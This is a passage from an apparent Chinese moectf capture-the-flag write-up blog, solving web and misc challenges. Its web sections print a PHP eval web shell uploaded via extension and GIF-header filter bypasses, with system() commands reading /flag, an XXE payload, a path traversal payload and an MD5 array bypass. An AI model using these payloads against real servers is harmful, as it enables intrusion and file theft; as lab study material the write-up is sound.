class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;type&#x27;</span>] !== <span class="hljs-string">&#x27;image/png&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件类型不符合要求&#x27;</span>]));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$tmp_path</span>) &gt; <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件太大&#x27;</span>]));<br>    &#125;<br><br>    <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$fileNameParts</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$fileName</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$fileNameParts</span>) &gt;= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-variable">$secondSegment</span> = <span class="hljs-variable">$fileNameParts</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$secondSegment</span> !== <span class="hljs-string">&#x27;png&#x27;</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件后缀不符合要求&#x27;</span>]));<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件后缀不符合要求&#x27;</span>]));<br>    &#125;<br><br>    <span class="hljs-variable">$uploadFilePath</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$targetDir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_path</span>, <span class="hljs-variable">$uploadFilePath</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;file_path&#x27;</span> =&gt; <span class="hljs-variable">$uploadFilePath</span>]));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件上传失败&#x27;</span>]));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>expload()函数为把字符串打散为数组</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">if</span> ($secondSegment !== <span class="hljs-string">&#x27;png&#x27;</span>) &#123;<br>            die(json_encode([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-keyword">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件后缀不符合要求&#x27;</span>]));<br>        &#125;<br></code></pre></td></tr></table></figure><p>以上源代码最重要的是绕过这个函数，$secondSegment为expload()分开的数组的第二个数组,也就是第一个.后面的字符串必须为png，那么我们提交2.png，提交成功，burpsuite抓包，把2.png后加为.php，是为2.png.php，如果直接提交2.png.php，会被识别出来<br>2.png</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>进入&#x2F;uploads&#x2F;2.png.php<br>输入命令</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">POST<br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>phpinfo()<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>cat flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;hmmm_improper_filter_DZlYPmdEjJNm86KgZDvyhzd9sQL_5Wep&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure><h2 id="web-–-gas-gas-gas"><a href="#web-–-gas-gas-gas" class="headerlink" title="web – gas!gas!gas!"></a>web – gas!gas!gas!</h2><p>这题需要写一个python脚本，出题人给出了解题方法<br>转弯漂移方向相反，油门大抓地小，油门小抓地大<br>源码中可以看到加减油门和方向的代码</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>a=requests.session()<br>url=<span class="hljs-string">&#x27;http://localhost:50262&#x27;</span><br><br><span class="hljs-keyword">data</span>=&#123;<br>    <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&#x27;213&#x27;</span>,<br>    <span class="hljs-string">&quot;steering_control&quot;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&quot;throttle&quot;</span>:<span class="hljs-string">&#x27;0&#x27;</span><br>&#125;<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    s=a.post(url=url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;moectf&#x27;</span> <span class="hljs-built_in">in</span> s.<span class="hljs-keyword">text</span>:<br>        print(s.<span class="hljs-keyword">text</span>)<br>        break<br>    pipei=re.findall(<span class="hljs-string">&quot;&lt;font color=\&quot;</span>red\<span class="hljs-string">&quot;&gt;([\u4e00-\u9fa5！，]+)&quot;</span>,s.<span class="hljs-keyword">text</span>)  # \u4e00-\u9fa5为unicode的中文编码区间<br>    print(<span class="hljs-keyword">data</span>)<br>    print(pipei)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;左&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;右&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;-1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;小&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;大&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;2&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;保持&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;直行&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;0&#x27;</span><br><br></code></pre></td></tr></table></figure><p>使用session.post而不是requests.post,因为requests.post在调用完成后就关闭了connect，cookies也随着被删除<br>而Session.Post() 调用后，保持会话连接，保存cookies，而cookies记录了你的用户名、密码、浏览的网页、停留的时间等等信息。<br>如果使用requests.post，在运行完成后，不会回显s.text<br><a href="https://blog.csdn.net/totorobig/article/details/111083521">session.post与requests.post原文</a></p><p>flag</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">这是你的奖励！ moectf&#123;Beautiful_Drifting!!_9nukWEcmlHZu85tOOipl_JpkwH3r2GUf&#125;<br></code></pre></td></tr></table></figure><h2 id="Misc-–打不开的图片1"><a href="#Misc-–打不开的图片1" class="headerlink" title="Misc –打不开的图片1"></a>Misc –打不开的图片1</h2><p>打开压缩包，找到一个不带文件格式的flag文件，加上文件后缀.jpg和.png都显示不了图片，使用记事本打开发现有一串字符比较可疑</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span> d <span class="hljs-number">6</span> f <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">7</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> b <span class="hljs-number">5</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> f <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> f <span class="hljs-number">7</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">7</span> <span class="hljs-number">2</span> <span class="hljs-number">7</span> <span class="hljs-number">9</span> <span class="hljs-number">5</span> f <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">7</span> d   <br></code></pre></td></tr></table></figure><p>去除空格后通过字符解码得到flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">XDU_i5_v3ry_6e@</span>u2ifu1&#125;<br></code></pre></td></tr></table></figure><p>方法二：<br>用notepad++十六进制打开flag，发现第一行和.jpg格式十分相像<br><img src="/images/0E7R4ZZN8TMFB32YR64X.png"><br>找一张电脑jpg图片第一行代码<br><img src="/images/SL12F6QWCWLF224SYB5.png"><br>对比发现flag少了d8 和ff，插入到ff和e0中<br>保存退出，改为jpg格式即可<br>这时就可以看见图片了，但flag不在图片中<br><img src="/images/TEMQ21D9A3GYH8.png"><br>同样的，使用字符解码即可得到flag</p><h2 id="Misc-–打不开的图片2"><a href="#Misc-–打不开的图片2" class="headerlink" title="Misc –打不开的图片2"></a>Misc –打不开的图片2</h2><p>使用notepad++打开flag.jpg<br>发现第一行类似于png格式<br><img src="/images/DZG2PE7CI2YYFKZUMBM1.png"><br>再找一个.png后缀的文件进行对比<br><img src="/images/E83NQ3G3OVUEVEU.png"><br>把前4列改了<br>使用png或jpg格式打开<br><img src="/images/RSQ3M1M1GFD17C8.png"></p><h2 id="Misc-–狗子-1-普通的猫"><a href="#Misc-–狗子-1-普通的猫" class="headerlink" title="Misc –狗子(1)普通的猫"></a>Misc –狗子(1)普通的猫</h2><p>hint中给了提示，那么我们直接十六进制打开<br>ctrl+f直接搜moe<br>成功找到</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;eeeez_f1ag_as_<span class="hljs-built_in">A_G1ft</span>!&#125; <br></code></pre></td></tr></table></figure><p>记事本也能找到</p><h2 id="Misc-–building-near-lake"><a href="#Misc-–building-near-lake" class="headerlink" title="Misc –building_near_lake"></a>Misc –building_near_lake</h2><p>看到tips:这图是可以放大的<br>首先想到flag可能藏在以显示的图片外，修改分辨率，发现并没有<br>那就利用互联网的优势，使用百度搜图<br><img src="/images/searchbox0xg0.jpg"><br>提取关键词，厦门大学，翔安校区，放大图看这是个图书馆，百度搜索翔安校区只有一个图书馆，启动坐标工具，经度为118.312，纬度为24.606<br>拍摄设备的<em>发布会</em>时间（8位数字，如2018年5月6日则为“20180506”）<br>注意是<strong>拍摄设备的发布会时间</strong>，而不是拍摄时间，我们把图片用记事本打开，可以找到类似的手机型号Redmi K60E，继续百度搜索<br><img src="/images/BU4C.png"><br>将三个问题回答后得到flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;P<span class="hljs-number">0</span>sT_Y<span class="hljs-number">0</span>uR_Ph<span class="hljs-number">0</span>T<span class="hljs-number">0</span>_wiTh_<span class="hljs-number">0</span>Rigi<span class="hljs-symbol">nal_File_is_n0</span>T_a_<span class="hljs-name">g00</span>d_idea_YlJf!<span class="hljs-name">M3</span>rux&#125;<br></code></pre></td></tr></table></figure><h2 id="web–了解你的座驾"><a href="#web–了解你的座驾" class="headerlink" title="web–了解你的座驾"></a>web–了解你的座驾</h2><p>下翻到XDU moeCTF Flag 获得信息flag掉到根目录里<br>用burpsuite抓取到post，<code>xml_content=&lt;xml&gt;&lt;name&gt;XDU moeCTF Flag&lt;/name&gt;&lt;/xml&gt;</code><br>xml对应的是xxe漏洞<br>用一个xxe漏洞模板</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">XXE</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">cmd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">yasuo</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;cmd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">yasuo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但不能直接提交上去，如果提交上去会报错<br>使用url编码(所有字符)<br>用burpsuite提交，hackbar有点问题</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">post</span>:<br><span class="hljs-attribute">xml_content</span>=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fxml%<span class="hljs-number">20</span>version%<span class="hljs-number">3</span>D%<span class="hljs-number">221</span>%<span class="hljs-number">2</span>E0%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>encoding%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>UTF%<span class="hljs-number">2</span>D8%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>DOCTYPE%<span class="hljs-number">20</span>XXE%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>ENTITY%<span class="hljs-number">20</span>cmd%<span class="hljs-number">20</span>SYSTEM%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>file%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Cyasuo%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Cname%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>cmd%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fname%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fyasuo%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><img src="/images/AJZADKZ93OVD5JGZC.png"></p><p>flag:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">moectf&#123;Which_one_You<span class="hljs-symbol">&#x27;ve_Chosen</span>?XzYkzCjh8V9GublHShh_IiKQF5RMNKwV&#125;<br></code></pre></td></tr></table></figure><h2 id="web–大海捞针"><a href="#web–大海捞针" class="headerlink" title="web–大海捞针"></a>web–大海捞针</h2><p>题目告诉了需要使用<a href="https://cloud.tencent.com/developer/article/1906161">爆破</a>，<br>use &#x2F;?id&#x3D;&lt;1-1000&gt; to connect to different parallel universes<br>(it might seem wired that the index is between 1 and 1000…)<br>进入题目也说明了flag藏在这1000个页面中<br>随便输入一个?id&#x3D;1抓包<br><img src="/images/KGMZ159ZAFRIMUXN.png"><br>send后进入intruder<br><img src="/images/BS9PDEN5PUUVQP.png"><br>使用sniper方法爆破id<br>payloads配置如下：<br><img src="/images/XU2SI3KKYR9BPX0.png"><br>即可开始爆破<br>发现id&#x3D;163 len不同<br><img src="/images/K2P60L3QO95IUT.png"><br>response查看找出flag</p><p>Flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;script_helps_ULOZw7NrjEIKRZ4V&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web–meo图床"><a href="#web–meo图床" class="headerlink" title="web–meo图床"></a>web–meo图床</h2><p>本题似乎对文件后缀没有过滤，提交1.php也可以，但它对内容有筛查，1.php中加入GIF89A以绕过<br>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>进入提交的目录，蚁剑和命令执行都不能用<br>右键复制图像，在电脑上用记事本打开<br>发现了我们注入的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>随便改改url，把name删掉一两个或改一改<br>出现报错信息，看看有无利用的点<br><img src="/images/XW1PKUL52UDXD1V53.png"></p><p>file_get_contents函数可以帮助我们读取文件信息<br>payload:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">GET</span>：<br>images.php?<span class="hljs-built_in">name</span>=../../../<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>右键复制图像，在电脑上用记事本打开</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">hello~<br>Flag Not Here~<br>Find Somewhere Else~<br><br><br><span class="hljs-comment">&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;</span><br><br>Not Here~~~~~~~~~~~~~ awa<br></code></pre></td></tr></table></figure><p>进入Fl3g_n0t_Here_dont_peek!!!!!.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$param1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>];<br>    <span class="hljs-variable">$param2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param1</span> !== <span class="hljs-variable">$param2</span>) &#123;<br>        <br>        <span class="hljs-variable">$md5Param1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param1</span>);<br>        <span class="hljs-variable">$md5Param2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param2</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5Param1</span> == <span class="hljs-variable">$md5Param2</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.O!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o??&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O?&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>简单的MD5漏洞，直接数组绕过即可<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Get<br>?para<span class="hljs-name">m1</span>[]=<span class="hljs-number">123</span>&amp;para<span class="hljs-name">m2</span>[]=<span class="hljs-number">456</span><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;oops_file_get_co<span class="hljs-symbol">ntents_controllable_DkqCQ6</span><span class="hljs-name">g402</span>lwjecsaxL<span class="hljs-meta">O7</span>AU<span class="hljs-number">6</span>x-_<span class="hljs-number">7</span><span class="hljs-symbol">n9</span>Ok&#125;<br></code></pre></td></tr></table></figure><h2 id="web–夺命十三枪"><a href="#web–夺命十三枪" class="headerlink" title="web–夺命十三枪"></a>web–夺命十三枪</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;Hanxin.exe.php&#x27;</span>);<br><br><span class="hljs-variable">$Chant</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>] : <span class="hljs-string">&#x27;夺命十三枪&#x27;</span>;<br><br><span class="hljs-variable">$new_visitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="hljs-variable">$Chant</span>);<br><br><span class="hljs-variable">$before</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new_visitor</span>);<br><span class="hljs-variable">$after</span> = <span class="hljs-title class_">Deadly_Thirteen_Spears</span>::<span class="hljs-title function_ invoke__">Make_a_Move</span>(<span class="hljs-variable">$before</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Movements: &#x27;</span> . <span class="hljs-variable">$after</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$after</span>);<br>&#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Even Caused A Glitch...&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Your Movements: O:<span class="hljs-number">34</span>:<span class="hljs-string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Chant&quot;</span>;s:<span class="hljs-number">15</span>:<span 